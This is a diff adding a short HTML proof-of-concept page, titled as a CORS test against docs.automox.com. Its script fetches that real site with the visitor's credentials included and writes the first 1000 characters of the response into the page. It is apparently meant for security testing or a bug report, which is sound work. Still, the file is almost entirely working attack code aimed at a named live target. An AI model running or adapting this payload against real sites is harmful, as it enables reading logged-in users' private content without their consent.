@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>⚠️ CORS PoC - docs.automox.com</h3>
+    <script>
+      fetch("https://docs.automox.com", {
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.body.innerHTML += "<pre>" + data.substring(0, 1000) + "</pre>";
+      })
+      .catch(err => {
+        document.body.innerHTML += "<pre>Error: " + err + "</pre>";
+      });
+    </script>
+  </body>
+</html>
